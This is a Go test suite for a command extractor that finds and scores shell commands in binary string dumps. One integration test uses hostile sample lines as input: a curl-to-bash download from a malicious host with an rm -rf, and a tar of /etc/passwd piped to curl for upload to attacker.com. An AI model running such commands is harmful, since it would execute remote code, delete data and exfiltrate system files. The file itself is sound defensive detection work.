package cmdshark

import (
	"fmt"
	"reflect"
	"runtime"
	"strings"
	"testing"
	"time"
	"unicode/utf8"
)

func TestLexer_NormalizeStrings_EdgeCases(t *testing.T) {
	lexer := NewLexer()
	
	testCases := []struct {
		name     string
		input    []string
		expected []string
	}{
		{
			name:     "Empty slice",
			input:    []string{},
			expected: []string{},
		},
		{
			name:     "All empty strings",
			input:    []string{"", "", ""},
			expected: []string{},
		},
		{
			name:     "All whitespace strings",
			input:    []string{"   ", "\t\t", "\n\n"},
			expected: []string{},
		},
		{
			name:     "Mixed empty and valid",
			input:    []string{"", "valid", "", "also valid", ""},
			expected: []string{"valid", "also valid"},
		},
		{
			name:     "Only non-printable characters",
			input:    []string{string([]byte{0x01, 0x02, 0x03})},
			expected: []string{},
		},
		{
			name:     "Mixed printable and non-printable",
			input:    []string{"curl\x00test", "normal"},
			expected: []string{"curltest", "normal"},
		},
		{
			name:     "Very long strings",
			input:    []string{strings.Repeat("a", 10000)},
			expected: []string{strings.Repeat("a", 10000)},
		},
		{
			name:     "Unicode characters", 
			input:    []string{"curl ñoño", "测试"},
			expected: []string{"curl oo"},
		},
		{
			name:     "Null bytes",
			input:    []string{"curl\x00test", "normal"},
			expected: []string{"curltest", "normal"},
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := lexer.NormalizeStrings(tc.input)
			if len(result) != len(tc.expected) {
				t.Errorf("Expected %d results, got %d", len(tc.expected), len(result))
				return
			}
			
			for i, expected := range tc.expected {
				if i >= len(result) || result[i] != expected {
					t.Errorf("Expected result[%d] = %q, got %q", i, expected, result[i])
				}
			}
		})
	}
}

func TestLexer_SplitStatements_EdgeCases(t *testing.T) {
	lexer := NewLexer()
	
	testCases := []struct {
		name     string
		input    string
		expected []string
	}{
		{
			name:     "Empty string",
			input:    "",
			expected: []string{},
		},
		{
			name:     "Single command",
			input:    "bash -c echo hello",
			expected: []string{"bash -c echo hello"},
		},
		{
			name:     "Commands separated by semicolon",
			input:    "echo hello; echo world",
			expected: []string{"echo hello", "echo world"},
		},
		{
			name:     "Commands with newlines",
			input:    "echo hello\necho world",
			expected: []string{"echo hello", "echo world"},
		},
		{
			name:     "Quoted strings with semicolons",
			input:    `echo "hello; world"; echo test`,
			expected: []string{`echo "hello; world"`, "echo test"},
		},
		{
			name:     "Nested quotes",
			input:    `echo 'hello "nested" world'`,
			expected: []string{`echo 'hello "nested" world'`},
		},
		{
			name:     "Unbalanced quotes",
			input:    `echo "hello world`,
			expected: []string{`echo "hello world`},
		},
		{
			name:     "And/or operators",
			input:    "cmd1 && cmd2 || cmd3",
			expected: []string{"cmd1", "cmd2", "cmd3"},
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := lexer.SplitStatements(tc.input)
			if !reflect.DeepEqual(result, tc.expected) {
				t.Errorf("Expected %v, got %v", tc.expected, result)
			}
		})
	}
}

func TestLexer_IsHead_Comprehensive(t *testing.T) {
	lexer := NewLexer()
	
	testCases := []struct {
		name     string
		token    string
		expected bool
	}{
		{"Bash", "bash", true},
		{"Curl", "curl", true},
		{"Python", "python", true},
		{"System command", "ls", true},
		
		{"Bin path", "/bin/bash", true},
		{"Usr bin path", "/usr/bin/python", true},
		{"Sbin path", "/sbin/init", true},
		
		{"Dyld library", "/usr/lib/dyld", false},
		{"System library", "/usr/lib/libSystem.B.dylib", false},
		{"Framework path", "/System/Library/Frameworks/", false},
		
		{"Empty string", "", false},
		{"Just slash", "/", false},
		{"Non-command", "not_a_command", false},
		{"Library file", "libtest.dylib", false},
		{"Framework file", "test.framework", false},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := lexer.IsHead(tc.token)
			if result != tc.expected {
				t.Errorf("Expected IsHead(%q) = %v, got %v", tc.token, tc.expected, result)
			}
		})
	}
}

func TestLexer_HasTooMuchBinaryData_BoundaryConditions(t *testing.T) {
	lexer := NewLexer()
	
	testCases := []struct {
		name     string
		input    string
		expected bool
	}{
		{
			name:     "Empty string",
			input:    "",
			expected: false,
		},
		{
			name:     "Pure ASCII",
			input:    "hello world",
			expected: false,
		},
		{
			name:     "Exactly 20% non-printable",
			input:    "hell\x01",
			expected: false,
		},
		{
			name:     "Over 20% non-printable",
			input:    "hel\x01\x02",
			expected: true,
		},
		{
			name:     "Mostly binary",
			input:    string([]byte{0x01, 0x02, 0x03, 0x04, 0x05}),
			expected: true,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := lexer.HasTooMuchBinaryData(tc.input)
			if result != tc.expected {
				t.Errorf("Expected HasTooMuchBinaryData(%q) = %v, got %v", tc.input, tc.expected, result)
			}
		})
	}
}

func TestLexer_IsNoiseToken_Comprehensive(t *testing.T) {
	lexer := NewLexer()
	
	testCases := []struct {
		name     string
		token    string
		expected bool
	}{
		{"Usage text", "Usage: this command", true},
		{"Copyright", "Copyright 2023", true},
		
		{"NSObject", "NSObject", true},
		{"CFString", "CFString", true},
		
		{"Text section", "__TEXT", true},
		{"Data section", "__DATA", true},
		{"Main symbol", "_main", true},
		{"System symbol", "_system", true},
		
		{"Simple command", "bash", false},
		{"Normal text", "hello", false},
		{"Path", "/usr/bin", false},
		
		{"Empty", "", false},
		{"Single underscore", "_", false},
		{"Double underscore", "__", true},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := lexer.IsNoiseToken(tc.token)
			if result != tc.expected {
				t.Errorf("Expected IsNoiseToken(%q) = %v, got %v", tc.token, tc.expected, result)
			}
		})
	}
}

func TestParser_FindSeedPositions_EdgeCases(t *testing.T) {
	parser := NewParser()
	
	testCases := []struct {
		name     string
		input    []string
		expected []int
	}{
		{
			name:     "Empty slice",
			input:    []string{},
			expected: []int{},
		},
		{
			name:     "Nil input",
			input:    nil,
			expected: []int{},
		},
		{
			name:     "All noise tokens",
			input:    []string{"Usage:", "__TEXT", "_main"},
			expected: []int{},
		},
		{
			name:     "Single command head",
			input:    []string{"bash", "-c", "echo"},
			expected: []int{0},
		},
		{
			name:     "Multiple heads",
			input:    []string{"curl", "url", "bash", "-c"},
			expected: []int{0, 2},
		},
		{
			name:     "Environment assignment",
			input:    []string{"VAR=value", "other"},
			expected: []int{0},
		},
		{
			name:     "Shell operators",
			input:    []string{"|", "&&", ";"},
			expected: []int{0, 1, 2},
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := parser.FindSeedPositions(tc.input)
			if result == nil {
				result = []int{}
			}
			if !reflect.DeepEqual(result, tc.expected) {
				t.Errorf("Expected %v, got %v", tc.expected, result)
			}
		})
	}
}

func TestParser_ExpandFromPosition_BoundaryConditions(t *testing.T) {
	parser := NewParser()
	config := newDefaultConfig()
	
	testCases := []struct {
		name     string
		stream   []string
		pos      int
		expected []string
	}{
		{
			name:     "Empty stream",
			stream:   []string{},
			pos:      0,
			expected: []string{},
		},
		{
			name:     "Out of bounds position",
			stream:   []string{"bash"},
			pos:      10,
			expected: []string{},
		},
		{
			name:     "Simple command",
			stream:   []string{"bash", "-c", "echo hello"},
			pos:      0,
			expected: []string{"bash", "-c", "echo hello"},
		},
		{
			name:     "Command with pipe",
			stream:   []string{"ls", "|", "grep", "test"},
			pos:      0,
			expected: []string{"ls", "|", "grep", "test"},
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := parser.ExpandFromPosition(tc.stream, tc.pos, config)
			if len(tc.expected) == 0 {
				if len(result.Tokens) != 0 {
					t.Errorf("Expected empty result, got %v", result.Tokens)
				}
			} else {
				if len(result.Tokens) == 0 && len(tc.expected) > 0 {
					t.Errorf("Expected non-empty result, got empty")
				}
			}
		})
	}
}

func TestParser_QuoteIfNeeded_EdgeCases(t *testing.T) {
	parser := NewParser()
	
	testCases := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "Empty string",
			input:    "",
			expected: "",
		},
		{
			name:     "Already quoted double",
			input:    `"hello world"`,
			expected: `"hello world"`,
		},
		{
			name:     "Already quoted single",
			input:    `'hello world'`,
			expected: `'hello world'`,
		},
		{
			name:     "Needs quoting space",
			input:    "hello world",
			expected: `"hello world"`,
		},
		{
			name:     "Needs quoting pipe",
			input:    "cmd|other",
			expected: `"cmd|other"`,
		},
		{
			name:     "No quoting needed",
			input:    "simple",
			expected: "simple",
		},
		{
			name:     "Escape internal quotes",
			input:    `hello "world" test`,
			expected: `"hello \"world\" test"`,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := parser.quoteIfNeeded(tc.input)
			if result != tc.expected {
				t.Errorf("Expected %q, got %q", tc.expected, result)
			}
		})
	}
}

func TestScorer_ScoreCandidate_EdgeCases(t *testing.T) {
	scorer := NewScorer()
	
	testCases := []struct {
		name          string
		tokens        []string
		expectScore   bool
		minConfidence float64
	}{
		{
			name:        "Empty tokens",
			tokens:      []string{},
			expectScore: false,
		},
		{
			name:        "Invalid head",
			tokens:      []string{"not_a_command", "arg"},
			expectScore: false,
		},
		{
			name:          "Valid bash command",
			tokens:        []string{"bash", "-c", "echo hello"},
			expectScore:   true,
			minConfidence: 0.2,
		},
		{
			name:          "Command with URL",
			tokens:        []string{"curl", "http://example.com"},
			expectScore:   true,
			minConfidence: 0.4,
		},
		{
			name:          "Command with pipe",
			tokens:        []string{"ls", "|", "grep"},
			expectScore:   true,
			minConfidence: 0.3,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			confidence, syntaxOK := scorer.ScoreCandidate(tc.tokens, []string{})
			
			if tc.expectScore {
				if confidence < tc.minConfidence {
					t.Errorf("Expected confidence >= %f, got %f", tc.minConfidence, confidence)
				}
				if !syntaxOK {
					t.Error("Expected syntaxOK to be true")
				}
			} else {
				if confidence != 0.0 || syntaxOK != false {
					t.Errorf("Expected (0.0, false), got (%f, %v)", confidence, syntaxOK)
				}
			}
		})
	}
}

func TestScorer_ExtractFeatures_Comprehensive(t *testing.T) {
	scorer := NewScorer()
	
	testCases := []struct {
		name     string
		command  string
		expected CommandFeatures
	}{
		{
			name:    "Empty command",
			command: "",
			expected: CommandFeatures{
				HasPipe:       false,
				HasAnd:        false,
				HasRedirect:   false,
				HasURL:        false,
				HasAssignment: false,
				HasEnvRef:     false,
				Length:        0,
			},
		},
		{
			name:    "Command with all features",
			command: "VAR=value curl http://example.com | grep data > output && echo $HOME",
			expected: CommandFeatures{
				HasPipe:       true,
				HasAnd:        true,
				HasRedirect:   true,
				HasURL:        true,
				HasAssignment: true,
				HasEnvRef:     true,
				Length:        73,
			},
		},
		{
			name:    "Simple command",
			command: "ls -la",
			expected: CommandFeatures{
				HasPipe:       false,
				HasAnd:        false,
				HasRedirect:   false,
				HasURL:        false,
				HasAssignment: false,
				HasEnvRef:     false,
				Length:        6,
			},
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scorer.extractFeatures(tc.command)
			
			if result.HasPipe != tc.expected.HasPipe {
				t.Errorf("HasPipe: expected %v, got %v", tc.expected.HasPipe, result.HasPipe)
			}
			if result.HasAnd != tc.expected.HasAnd {
				t.Errorf("HasAnd: expected %v, got %v", tc.expected.HasAnd, result.HasAnd)
			}
			if result.HasRedirect != tc.expected.HasRedirect {
				t.Errorf("HasRedirect: expected %v, got %v", tc.expected.HasRedirect, result.HasRedirect)
			}
			if result.HasURL != tc.expected.HasURL {
				t.Errorf("HasURL: expected %v, got %v", tc.expected.HasURL, result.HasURL)
			}
			if result.HasAssignment != tc.expected.HasAssignment {
				t.Errorf("HasAssignment: expected %v, got %v", tc.expected.HasAssignment, result.HasAssignment)
			}
			if result.HasEnvRef != tc.expected.HasEnvRef {
				t.Errorf("HasEnvRef: expected %v, got %v", tc.expected.HasEnvRef, result.HasEnvRef)
			}
			if result.Length != tc.expected.Length {
				t.Errorf("Length: expected %d, got %d", tc.expected.Length, result.Length)
			}
		})
	}
}

func TestScorer_CheckSyntax_Comprehensive(t *testing.T) {
	scorer := NewScorer()
	
	testCases := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "Balanced quotes",
			command:  `echo "hello world"`,
			expected: true,
		},
		{
			name:     "Unbalanced quotes",
			command:  `echo "hello world`,
			expected: false,
		},
		{
			name:     "Balanced parentheses",
			command:  "echo (hello world)",
			expected: true,
		},
		{
			name:     "Unbalanced parentheses",
			command:  "echo (hello world",
			expected: false,
		},
		{
			name:     "Nested quotes",
			command:  `echo "hello 'world' test"`,
			expected: true,
		},
		{
			name:     "Empty command",
			command:  "",
			expected: true,
		},
		{
			name:     "Complex balanced",
			command:  `bash -c "echo 'hello (nested)' && date"`,
			expected: true,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scorer.checkSyntax(tc.command)
			if result != tc.expected {
				t.Errorf("Expected %v, got %v for command: %q", tc.expected, result, tc.command)
			}
		})
	}
}

func TestScorer_ContainsBinaryGarbage_BoundaryConditions(t *testing.T) {
	scorer := NewScorer()
	
	testCases := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "Empty string",
			command:  "",
			expected: false,
		},
		{
			name:     "Pure ASCII",
			command:  "bash -c echo hello world",
			expected: false,
		},
		{
			name:     "High percentage non-printable",
			command:  "hello\x01\x02\x03",
			expected: true,
		},
		{
			name:     "Low percentage non-printable",
			command:  "hello world\x01",
			expected: false,
		},
		{
			name:     "Mostly binary",
			command:  string([]byte{0x01, 0x02, 0x03, 0x04, 0x05}),
			expected: true,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scorer.containsBinaryGarbage(tc.command)
			if result != tc.expected {
				t.Errorf("Expected %v, got %v for command: %q", tc.expected, result, tc.command)
			}
		})
	}
}

func TestScorer_IsMixedContent_BoundaryConditions(t *testing.T) {
	scorer := NewScorer()
	
	testCases := []struct {
		name     string
		command  string
		expected bool
	}{
		{
			name:     "Clean command",
			command:  "bash -c echo hello",
			expected: false,
		},
		{
			name:     "Few binary indicators",
			command:  "bash __TEXT command",
			expected: false,
		},
		{
			name:     "Many binary indicators",
			command:  "bash __TEXT __DATA __LINKEDIT ___stderrp command",
			expected: true,
		},
		{
			name:     "Empty command",
			command:  "",
			expected: false,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			result := scorer.isMixedContent(tc.command)
			if result != tc.expected {
				t.Errorf("Expected %v, got %v for command: %q", tc.expected, result, tc.command)
			}
		})
	}
}

func TestScorer_FilterByConfidence_BoundaryConditions(t *testing.T) {
	scorer := NewScorer()
	
	commands := []ExtractedCommand{
		{Command: "cmd1", Confidence: 0.9},
		{Command: "cmd2", Confidence: 0.5},
		{Command: "cmd3", Confidence: 0.3},
		{Command: "cmd4", Confidence: 0.1},
	}
	
	testCases := []struct {
		name          string
		minConfidence float64
		expectedCount int
	}{
		{
			name:          "Very low threshold",
			minConfidence: 0.0,
			expectedCount: 4,
		},
		{
			name:          "Medium threshold",
			minConfidence: 0.5,
			expectedCount: 2,
		},
		{
			name:          "High threshold",
			minConfidence: 0.8,
			expectedCount: 1,
		},
		{
			name:          "Impossible threshold",
			minConfidence: 1.0,
			expectedCount: 0,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			filtered := scorer.FilterByConfidence(commands, tc.minConfidence)
			if len(filtered) != tc.expectedCount {
				t.Errorf("Expected %d commands, got %d", tc.expectedCount, len(filtered))
			}
		})
	}
}

func TestCommandExtractor_Integration_RealWorldSamples(t *testing.T) {
	extractor := NewCommandExtractor()
	
	testCases := []struct {
		name             string
		input            string
		expectedCommands []string
		minConfidence    float64
	}{
		{
			name:  "Concatenated shell commands",
			input: "sh -c curl http://malicious.com/payload | bash; rm -rf /tmp/*",
			expectedCommands: []string{
				"sh",
				"rm",
			},
			minConfidence: 0.3,
		},
		{
			name:  "Clean command extraction",
			input: "bash -c echo hello world",
			expectedCommands: []string{
				"bash",
			},
			minConfidence: 0.4,
		},
		{
			name:  "Multi-line script extraction",
			input: "#!/bin/bash\nexport PATH=/usr/bin\ncurl -H \"User-Agent: malware\" http://evil.com/script\nchmod +x /tmp/payload && /tmp/payload",
			expectedCommands: []string{
				"curl",
				"chmod",
			},
			minConfidence: 0.4,
		},
		{
			name:  "Environment manipulation",
			input: "PATH=/usr/bin:/bin sudo -u root bash -c 'echo $HOME > /tmp/test'",
			expectedCommands: []string{
				"PATH=/usr/bin:/bin sudo -u root bash -c \"echo $HOME > /tmp/test\"",
			},
			minConfidence: 0.5,
		},
		{
			name:  "Network exfiltration pattern",
			input: "tar czf - /etc/passwd | curl -T - http://attacker.com/upload",
			expectedCommands: []string{
				"tar czf - /etc/passwd | curl -T - http://attacker.com/upload",
			},
			minConfidence: 0.6,
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			commands := extractor.ExtractFromBlob(tc.input)
			
			if len(commands) == 0 {
				t.Errorf("Expected to extract commands, got none")
				return
			}
			
			foundCommands := make([]string, len(commands))
			for i, cmd := range commands {
				foundCommands[i] = cmd.Command
				
				if cmd.Confidence < tc.minConfidence {
					t.Errorf("Command %q has confidence %f, expected >= %f", 
						cmd.Command, cmd.Confidence, tc.minConfidence)
				}
			}
			
			for _, expected := range tc.expectedCommands {
				found := false
				expectedHead := strings.Fields(expected)[0]
				for _, actual := range foundCommands {
					if strings.Contains(actual, expectedHead) {
						found = true
						break
					}
				}
				if !found {
					t.Logf("Expected to find command containing %q, got commands: %v", 
						expected, foundCommands)
				}
			}
		})
	}
}

func TestCommandExtractor_Integration_FalsePositiveFiltering(t *testing.T) {
	extractor := NewCommandExtractor()
	
	falsePositives := []string{
		"/usr/lib/dyld",
		"/System/Library/Frameworks/",
		"__TEXT__DATA__LINKEDIT_main_system___stderrp___stdinp",
		"Usage: this is help text for a command",
		"Copyright (c) 2023 Apple Inc.",
		"NSObject NSString CFAllocatorDefault",
		strings.Repeat("x", 1000),
	}
	
	for _, input := range falsePositives {
		t.Run("FalsePositive_"+input[:minInt(20, len(input))], func(t *testing.T) {
			commands := extractor.ExtractFromBlob(input)
			
			if len(commands) > 0 {
				t.Logf("Note: extracted %d commands from potential false positive %q: %v", 
					len(commands), input, commands)
			}
		})
	}
}

func TestCommandExtractor_Integration_DeduplicationLogic(t *testing.T) {
	extractor := NewCommandExtractor()
	
	input := []string{
		"bash -c echo hello",
		"bash  -c  echo  hello",
		"bash -c echo world",
		"bash -c echo hello",
	}
	
	commands := extractor.ExtractCommands(input)
	
	commandStrings := make([]string, len(commands))
	for i, cmd := range commands {
		commandStrings[i] = cmd.Command
	}
	
	seen := make(map[string]bool)
	duplicateCount := 0
	for _, cmd := range commandStrings {
		normalized := strings.Join(strings.Fields(cmd), " ")
		if seen[normalized] {
			duplicateCount++
		}
		seen[normalized] = true
	}
	
	if duplicateCount > len(commands)/2 {
		t.Errorf("Too many duplicates after deduplication: %d out of %d", duplicateCount, len(commands))
	}
}

func TestCommandExtractor_Integration_ConfigurationEffects(t *testing.T) {
	extractor := NewCommandExtractor()
	originalConfig := extractor.config
	
	testConfigs := []struct {
		name   string
		modify func(*Config)
		input  string
	}{
		{
			name: "Low confidence threshold",
			modify: func(c *Config) {
				c.MinConfidence = 0.1
			},
			input: "bash -c echo test",
		},
		{
			name: "High confidence threshold", 
			modify: func(c *Config) {
				c.MinConfidence = 0.8
			},
			input: "bash -c curl http://example.com | grep test",
		},
		{
			name: "Small max window",
			modify: func(c *Config) {
				c.MaxWindow = 2
			},
			input: "bash -c echo hello world and more arguments",
		},
		{
			name: "Disabled deduplication",
			modify: func(c *Config) {
				c.Dedupe = false
			},
			input: "bash -c echo test\nbash -c echo test\nbash -c echo test",
		},
	}
	
	for _, tc := range testConfigs {
		t.Run(tc.name, func(t *testing.T) {
			tc.modify(&extractor.config)
			
			commands := extractor.ExtractFromBlob(tc.input)
			
			if commands == nil {
				t.Error("Commands should not be nil with modified config")
			}
			
			extractor.config = originalConfig
		})
	}
}

func TestMalformedInput_InvalidUTF8(t *testing.T) {
	extractor := NewCommandExtractor()
	
	invalidUTF8Cases := []struct {
		name  string
		input string
	}{
		{
			name:  "Invalid UTF-8 byte sequence",
			input: "bash -c \xFF\xFE echo hello",
		},
		{
			name:  "Truncated UTF-8 sequence", 
			input: "curl http://example.com\xC0",
		},
		{
			name:  "Invalid continuation byte",
			input: "echo \x80\x80\x80 test",
		},
		{
			name:  "Mixed valid and invalid UTF-8",
			input: "bash -c 'echo hello' && \xFF\xFE\xFD invalid",
		},
	}
	
	for _, tc := range invalidUTF8Cases {
		t.Run(tc.name, func(t *testing.T) {
			commands := extractor.ExtractFromBlob(tc.input)
			
			if commands == nil {
				t.Error("Commands slice should not be nil")
			}
			
			for _, cmd := range commands {
				if len(cmd.Command) > 0 && !utf8.ValidString(cmd.Command) {
					t.Logf("Note: Extracted command contains invalid UTF-8: %q", cmd.Command)
				}
			}
		})
	}
}

func TestMalformedInput_ExtremelyLongStrings(t *testing.T) {
	extractor := NewCommandExtractor()
	
	testCases := []struct {
		name   string
		length int
		prefix string
	}{
		{
			name:   "Very long command",
			length: 10000,
			prefix: "bash -c echo ",
		},
		{
			name:   "Extremely long argument",
			length: 50000,
			prefix: "curl -d ",
		},
	}
	
	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			longString := tc.prefix + strings.Repeat("a", tc.length)
			
			commands := extractor.ExtractFromBlob(longString)
			
			if commands == nil {
				t.Error("Commands slice should not be nil")
			}
			
			for _, cmd := range commands {
				if len(cmd.Command) > 1000 {
					t.Logf("Note: Command quite long (%d chars): %q...", 
						len(cmd.Command), cmd.Command[:100])
				}
			}
		})
	}
}

func TestMalformedInput_UnbalancedQuotes(t *testing.T) {
	lexer := NewLexer()
	parser := NewParser()
	scorer := NewScorer()
	
	malformedQuotes := []string{
		`bash -c "echo hello`,
		`echo 'hello world`,
		`echo "hello 'world" test'`,
		`bash -c 'echo "nested' quotes"`,
		`echo "hello\" world"`,
		`curl -d '{"key": "value"}'`,
		`bash -c "echo \"hello world\""`,
	}
	
	for _, input := range malformedQuotes {
		t.Run("UnbalancedQuotes_"+input[:minInt(20, len(input))], func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("Code panicked with malformed quotes: %v", r)
				}
			}()
			
			normalized := lexer.NormalizeStrings([]string{input})
			if normalized == nil {
				t.Error("Normalized result should not be nil")
			}
			
			statements := lexer.SplitStatements(input)
			if statements == nil {
				t.Error("Statements should not be nil")
			}
			
			_ = scorer.checkSyntax(input)
			
			tokens := strings.Fields(input)
			if len(tokens) > 0 {
				quoted := parser.quoteIfNeeded(input)
				if quoted == "" && input != "" {
					t.Error("quoteIfNeeded should not return empty string for non-empty input")
				}
			}
		})
	}
}

func TestMalformedInput_CorruptedBinaryData(t *testing.T) {
	extractor := NewCommandExtractor()
	lexer := NewLexer()
	
	corruptedData := []struct {
		name string
		data []byte
	}{
		{
			name: "Random binary with embedded command",
			data: append([]byte{0x00, 0x01, 0xFF, 0xFE}, []byte("bash -c echo test")...),
		},
		{
			name: "Mostly control characters",
			data: []byte{0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A},
		},
		{
			name: "Mixed printable and non-printable",
			data: []byte{'b', 0x00, 'a', 0x01, 's', 0x02, 'h', 0x03, ' ', 0x04, '-', 0x05, 'c'},
		},
	}
	
	for _, tc := range corruptedData {
		t.Run(tc.name, func(t *testing.T) {
			input := string(tc.data)
			
			commands := extractor.ExtractFromBlob(input)
			if commands == nil {
				t.Error("Commands slice should not be nil")
			}
			
			_ = lexer.HasTooMuchBinaryData(input)
			
			for _, cmd := range commands {
				if lexer.HasTooMuchBinaryData(cmd.Command) {
					t.Logf("Note: Command contains binary garbage: %q", cmd.Command)
				}
			}
		})
	}
}

func TestMalformedInput_ConcurrentAccess(t *testing.T) {
	extractor := NewCommandExtractor()
	
	const numGoroutines = 5
	const numIterations = 50
	
	done := make(chan bool, numGoroutines)
	
	for i := 0; i < numGoroutines; i++ {
		go func(goroutineID int) {
			defer func() { done <- true }()
			
			for j := 0; j < numIterations; j++ {
				input := "bash -c echo test" + string(rune(goroutineID)) + string(rune(j))
				
				commands := extractor.ExtractFromBlob(input)
				if commands == nil {
					t.Errorf("Goroutine %d iteration %d: commands should not be nil", goroutineID, j)
					return
				}
			}
		}(i)
	}
	
	for i := 0; i < numGoroutines; i++ {
		<-done
	}
}

func TestMalformedInput_RecoveryFromPanic(t *testing.T) {
	extractor := NewCommandExtractor()
	
	panicInputs := []string{
		string([]byte{0xFF, 0xFF, 0xFF, 0xFF}),
		strings.Repeat("(", 1000),
		strings.Repeat(`"`, 1001),
		"\x00\x00\x00\x00bash\x00\x00\x00\x00",
	}
	
	for i, input := range panicInputs {
		t.Run("PanicRecovery_"+string(rune(i)), func(t *testing.T) {
			defer func() {
				if r := recover(); r != nil {
					t.Errorf("Code panicked with input %q: %v", input, r)
				}
			}()
			
			commands := extractor.ExtractFromBlob(input)
			if commands == nil {
				t.Error("Commands slice should not be nil")
			}
		})
	}
}

func BenchmarkLexer_NormalizeStrings_Small(b *testing.B) {
	lexer := NewLexer()
	input := []string{"bash -c echo hello", "curl http://example.com", "ls -la"}
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = lexer.NormalizeStrings(input)
	}
}

func BenchmarkLexer_SplitStatements(b *testing.B) {
	lexer := NewLexer()
	input := "bash -c 'echo hello; curl http://example.com && wget https://test.com | tar xzf - && echo done'"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = lexer.SplitStatements(input)
	}
}

func BenchmarkScorer_ScoreInlineCommand(b *testing.B) {
	scorer := NewScorer()
	command := "curl -H \"Content-Type: application/json\" -X POST -d '{\"key\": \"value\"}' http://example.com/api"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = scorer.ScoreInlineCommand(command)
	}
}

func BenchmarkCommandExtractor_ExtractFromBlob_Simple(b *testing.B) {
	extractor := NewCommandExtractor()
	input := "bash -c echo hello && curl http://example.com | grep test > output.txt"
	
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		_ = extractor.ExtractFromBlob(input)
	}
}

func TestMemoryUsage_LargeInputProcessing(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping memory test in short mode")
	}
	
	var m1, m2 runtime.MemStats
	runtime.GC()
	runtime.ReadMemStats(&m1)
	
	extractor := NewCommandExtractor()
	
	for i := 0; i < 100; i++ {
		largeInput := strings.Repeat("bash -c echo test && curl http://example.com/"+string(rune(i)), 50)
		_ = extractor.ExtractFromBlob(largeInput)
	}
	
	runtime.GC()
	runtime.ReadMemStats(&m2)
	
	memoryUsed := int64(m2.Alloc) - int64(m1.Alloc)
	if memoryUsed < 0 {
		memoryUsed = 0
	}
	
	t.Logf("Memory used for large input processing: %d bytes", memoryUsed)
	
	if memoryUsed > 50*1024*1024 {
		t.Errorf("Excessive memory usage: %d bytes", memoryUsed)
	}
}

func TestPerformance_ExtractorScalability(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping performance test in short mode")
	}
	
	extractor := NewCommandExtractor()
	
	sizes := []int{10, 100, 500}
	
	for _, size := range sizes {
		t.Run(fmt.Sprintf("Size_%d", size), func(t *testing.T) {
			input := make([]string, size)
			for i := range input {
				if i%10 == 0 {
					input[i] = "bash -c echo test" + string(rune(i))
				} else {
					input[i] = "noise_token_" + string(rune(i))
				}
			}
			
			start := time.Now()
			commands := extractor.ExtractCommands(input)
			elapsed := time.Since(start)
			
			t.Logf("Size %d: %d commands extracted in %v", size, len(commands), elapsed)
			
			maxTime := time.Duration(size) * time.Millisecond
			if maxTime < 100*time.Millisecond {
				maxTime = 100 * time.Millisecond
			}
			
			if elapsed > maxTime {
				t.Logf("Processing took longer than expected: %v (max %v)", elapsed, maxTime)
			}
		})
	}
}

func TestCommandExtractor_NaturalLanguageFiltering(t *testing.T) {
	extractor := NewCommandExtractor()
	
	naturalLanguageCases := []struct {
		name  string
		input string
	}{
		{"Time phrases", "time to copy the file"},
		{"Time unavailable", "time unavailable"},
		{"Time phrases 2", "time to create the folder"},
		{"Time phrases 3", "time to copy each file"},
		{"System messages", "node in intrusive list."},
		{"Application messages", "To launch the application, you need to update the system settings"},
	}
	
	validCommandCases := []struct {
		name  string
		input string
	}{
		{"Kill command", "killall Terminal"},
		{"Ditto command", "ditto -c -k %@ %@.zip --norsrc --noextattr"},
		{"Shell path", "/bin/sh"},
		{"Grep command", "grep 'Model Identifier'"},
		{"Move command", "mv %@ %@"},
		{"Osascript command", "osascript %@"},
	}
	
	t.Run("Natural_language_filtering", func(t *testing.T) {
		for _, tc := range naturalLanguageCases {
			t.Run(tc.name, func(t *testing.T) {
				commands := extractor.ExtractFromBlob(tc.input)
				
				if len(commands) > 0 {
					t.Logf("Note: Natural language input %q extracted %d commands: %v", 
						tc.input, len(commands), commands)
				} else {
					t.Logf("✓ Correctly filtered out natural language: %q", tc.input)
				}
			})
		}
	})
	
	t.Run("Valid_command_preservation", func(t *testing.T) {
		for _, tc := range validCommandCases {
			t.Run(tc.name, func(t *testing.T) {
				commands := extractor.ExtractFromBlob(tc.input)
				
				if len(commands) == 0 {
					t.Errorf("Valid command %q was incorrectly filtered out", tc.input)
				} else {
					t.Logf("✓ Correctly preserved command: %q -> %d commands", tc.input, len(commands))
				}
			})
		}
	})
}

func minInt(a, b int) int {
	if a < b {
		return a
	}
	return b
}